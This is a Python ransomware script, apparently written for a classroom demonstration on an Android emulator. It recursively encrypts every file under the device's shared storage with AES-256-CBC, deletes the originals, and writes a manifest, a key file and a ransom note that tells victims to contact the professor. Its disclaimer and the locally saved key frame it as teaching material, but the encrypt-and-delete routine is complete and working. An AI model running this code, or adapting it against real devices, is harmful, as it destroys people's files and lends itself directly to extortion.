#!/usr/bin/env python3
"""
Ransomware Payload - Pulled from GitHub on-demand.
Runs inside Android emulator, targets /storage/emulated/0/.
"""
import os
import sys
import json
from datetime import datetime
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# Configuration
TARGET_ROOT = "/storage/emulated/0/"
SKIP_DIRS = ["/storage/emulated/0/Android/data", 
             "/storage/emulated/0/Android/obb",
             "/storage/emulated/0/Android/media"]
ENCRYPTED_EXT = ".enc"
MANIFEST_FILE = "/storage/emulated/0/ransomware_manifest.txt"
RANSOM_NOTE_FILE = "/storage/emulated/0/RANSOM_NOTE.txt"
KEY_FILE = "/storage/emulated/0/encryption_key.key"

def generate_key_iv():
    """Generate AES-256 key and 16-byte IV."""
    key = os.urandom(32)  # 256-bit
    iv = os.urandom(16)   # 128-bit
    return key, iv

def encrypt_file(file_path, key, iv):
    """Encrypt a single file using AES-256-CBC."""
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        
        # Pad to block size
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded = padder.update(plaintext) + padder.finalize()
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded) + encryptor.finalize()
        
        # Write encrypted file with .enc extension
        enc_path = file_path + ENCRYPTED_EXT
        with open(enc_path, 'wb') as f:
            f.write(ciphertext)
        
        # Delete original
        os.remove(file_path)
        return enc_path
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")
        return None

def should_skip(path):
    """Check if path is in protected Android directories."""
    for skip in SKIP_DIRS:
        if path.startswith(skip):
            return True
    return False

def walk_and_encrypt(root, key, iv):
    """Recursively traverse and encrypt files."""
    encrypted_files = []
    for dirpath, dirnames, filenames in os.walk(root):
        # Skip protected directories
        if should_skip(dirpath):
            continue
        # Also skip if any parent is protected (handled above)
        for fname in filenames:
            full_path = os.path.join(dirpath, fname)
            # Skip already encrypted files or our own created files
            if fname.endswith(ENCRYPTED_EXT) or fname in [os.path.basename(MANIFEST_FILE), 
                                                          os.path.basename(RANSOM_NOTE_FILE),
                                                          os.path.basename(KEY_FILE)]:
                continue
            print(f"Encrypting: {full_path}")
            enc_path = encrypt_file(full_path, key, iv)
            if enc_path:
                encrypted_files.append(enc_path)
    return encrypted_files

def write_manifest(encrypted_files, key, iv):
    """Write ransomware manifest and key file."""
    # Write manifest
    manifest_content = f"""RANSOMWARE MANIFEST
====================
Deployment Time: {datetime.now().isoformat()}
Total Files Encrypted: {len(encrypted_files)}
Encryption: AES-256-CBC
Key (hex): {key.hex()}
IV (hex): {iv.hex()}

Encrypted Files:
----------------
"""
    for f in encrypted_files:
        manifest_content += f"{f}\n"
    
    with open(MANIFEST_FILE, 'w') as f:
        f.write(manifest_content)
    
    # Write key file (key + iv concatenated)
    with open(KEY_FILE, 'wb') as f:
        f.write(key + iv)
    
    # Write ransom note
    note_content = """YOUR FILES HAVE BEEN ENCRYPTED!
================================
All your files in /storage/emulated/0/ have been encrypted with AES-256-CBC.

To recover your files, contact the professor for the decryption key.

DO NOT attempt to decrypt on your own — you may lose data forever.

This is a DEMONSTRATION for educational purposes only.
No real harm is done. The key is saved in encryption_key.key.

"""
    with open(RANSOM_NOTE_FILE, 'w') as f:
        f.write(note_content)

def main():
    print("Ransomware payload executed.")
    print(f"Target: {TARGET_ROOT}")
    print(f"Creating manifest at: {MANIFEST_FILE}")
    
    # Check if target exists
    if not os.path.exists(TARGET_ROOT):
        print(f"Error: {TARGET_ROOT} not found.")
        sys.exit(1)
    
    # Generate key and IV
    key, iv = generate_key_iv()
    print(f"Key generated: {key.hex()}")
    print(f"IV generated: {iv.hex()}")
    
    # Encrypt files
    encrypted = walk_and_encrypt(TARGET_ROOT, key, iv)
    print(f"Encrypted {len(encrypted)} files.")
    
    # Write manifest and key
    write_manifest(encrypted, key, iv)
    print(f"Manifest written to {MANIFEST_FILE}")
    print(f"Key saved to {KEY_FILE}")
    print(f"Ransom note written to {RANSOM_NOTE_FILE}")
    print("Payload execution complete.")

if __name__ == "__main__":
    main()
